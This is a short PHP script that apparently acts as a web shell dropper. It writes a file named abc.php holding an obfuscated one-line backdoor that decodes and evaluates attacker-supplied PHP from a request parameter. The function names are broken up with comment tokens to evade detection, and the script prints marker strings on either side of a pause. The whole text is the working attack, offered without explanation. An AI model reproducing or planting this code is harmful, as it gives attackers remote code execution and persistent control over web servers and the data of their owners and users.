<?php
echo "123";
file_put_contents('abc.php','<?php @eval/**/(base64_decode/**/($_REQUEST/**/[6]));?>');
sleep(5);
echo "456";
?>
